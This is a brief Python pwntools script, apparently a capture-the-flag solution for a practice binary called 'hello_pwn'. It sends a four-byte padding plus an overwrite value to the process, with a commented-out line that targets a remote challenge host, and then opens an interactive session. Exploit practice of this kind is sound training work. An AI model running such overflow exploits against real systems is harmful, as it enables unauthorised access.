#!/usr/bin/env python

from pwn import *


p = process('./hello_pwn')
# p = process('./hello_pwn_userbin')
# p = remote('192.168.231.140', 10004)
p.sendline("A"*4 + "\x61\x61\x75\x6e")

p.interactive()